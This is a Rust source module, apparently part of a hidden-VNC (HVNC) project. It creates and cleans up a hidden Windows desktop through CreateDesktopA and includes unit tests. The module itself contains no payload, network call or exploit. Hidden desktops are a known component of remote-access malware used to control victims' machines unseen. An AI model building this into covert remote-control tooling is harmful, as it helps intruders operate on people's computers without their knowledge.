//! Hidden desktop management for Windows

use crate::{HvncError, Result};
use std::ffi::CString;
use std::ptr;
use winapi::um::winuser::{CreateDesktopA, CloseDesktop};
use winapi::um::winnt::GENERIC_ALL;
use winapi::shared::windef::HDESK;

/// Handle to a Windows desktop
pub type DesktopHandle = HDESK;

/// Hidden desktop manager
pub struct HiddenDesktop {
    handle: DesktopHandle,
    name: String,
}

impl HiddenDesktop {
    /// Create a new hidden desktop
    pub fn create(name: &str) -> Result<Self> {
        create_hidden_desktop(name)
    }
    
    /// Get the desktop handle
    pub fn handle(&self) -> DesktopHandle {
        self.handle
    }
    
    /// Get the desktop name
    pub fn name(&self) -> &str {
        &self.name
    }
}

impl Drop for HiddenDesktop {
    fn drop(&mut self) {
        if !self.handle.is_null() {
            unsafe {
                CloseDesktop(self.handle);
            }
        }
    }
}

/// Create a hidden desktop using Windows CreateDesktopA API
pub fn create_hidden_desktop(name: &str) -> Result<HiddenDesktop> {
    // Convert name to C string
    let c_name = CString::new(name)
        .map_err(|e| HvncError::desktop_creation("desktop", format!("Invalid desktop name: {}", e)))?;
    
    // Create the desktop with full access rights
    let handle = unsafe {
        CreateDesktopA(
            c_name.as_ptr(),           // Desktop name
            ptr::null_mut(),           // Device name (null for default)
            ptr::null_mut(),           // Device mode (null for default)
            0,                         // Flags (0 for default)
            GENERIC_ALL,        // Access rights
            ptr::null_mut(),           // Security attributes (null for default)
        )
    };
    
    if handle.is_null() {
        let error_code = unsafe { winapi::um::errhandlingapi::GetLastError() };
        return Err(HvncError::desktop_creation(
            name,
            format!("Failed to create desktop: Windows error code {}", error_code)
        ));
    }
    
    Ok(HiddenDesktop {
        handle,
        name: name.to_string(),
    })
}
#[
cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_create_hidden_desktop_success() {
        let desktop_name = "test_hidden_desktop";
        let result = create_hidden_desktop(desktop_name);
        
        assert!(result.is_ok(), "Desktop creation should succeed");
        
        let desktop = result.unwrap();
        assert_eq!(desktop.name(), desktop_name);
        assert!(!desktop.handle().is_null(), "Desktop handle should not be null");
        
        // Desktop should be automatically cleaned up when dropped
    }
    
    #[test]
    fn test_create_hidden_desktop_with_empty_name() {
        let result = create_hidden_desktop("");
        
        // Empty name should still work as it's a valid C string
        assert!(result.is_ok(), "Desktop creation with empty name should succeed");
    }
    
    #[test]
    fn test_create_hidden_desktop_with_special_chars() {
        let desktop_name = "test_desktop_123!@#";
        let result = create_hidden_desktop(desktop_name);
        
        assert!(result.is_ok(), "Desktop creation with special characters should succeed");
        
        let desktop = result.unwrap();
        assert_eq!(desktop.name(), desktop_name);
    }
    
    #[test]
    fn test_hidden_desktop_drop_cleanup() {
        let desktop_name = "test_cleanup_desktop";
        let desktop = create_hidden_desktop(desktop_name).expect("Desktop creation should succeed");
        let handle = desktop.handle();
        
        // Verify handle is valid
        assert!(!handle.is_null());
        
        // Drop the desktop explicitly
        drop(desktop);
        
        // After drop, we can't directly verify the handle is closed since
        // Windows doesn't provide a direct way to check handle validity,
        // but the Drop implementation should have called CloseDesktop
    }
    
    #[test]
    fn test_multiple_desktops_with_same_name() {
        let desktop_name = "duplicate_desktop";
        
        let desktop1 = create_hidden_desktop(desktop_name).expect("First desktop creation should succeed");
        let desktop2 = create_hidden_desktop(desktop_name).expect("Second desktop creation should succeed");
        
        // Both should have valid but different handles
        assert!(!desktop1.handle().is_null());
        assert!(!desktop2.handle().is_null());
        assert_ne!(desktop1.handle(), desktop2.handle(), "Handles should be different");
        
        // Both should have the same name
        assert_eq!(desktop1.name(), desktop_name);
        assert_eq!(desktop2.name(), desktop_name);
    }
    
    #[test]
    fn test_create_hidden_desktop_with_null_chars() {
        // Test with string containing null character (should fail)
        let desktop_name = "test\0desktop";
        let result = create_hidden_desktop(desktop_name);
        
        assert!(result.is_err(), "Desktop creation with null character should fail");
        
        if let Err(HvncError::DesktopCreation(msg)) = result {
            assert!(msg.contains("Invalid desktop name"), "Error should mention invalid name");
        } else {
            panic!("Expected DesktopCreation error");
        }
    }
}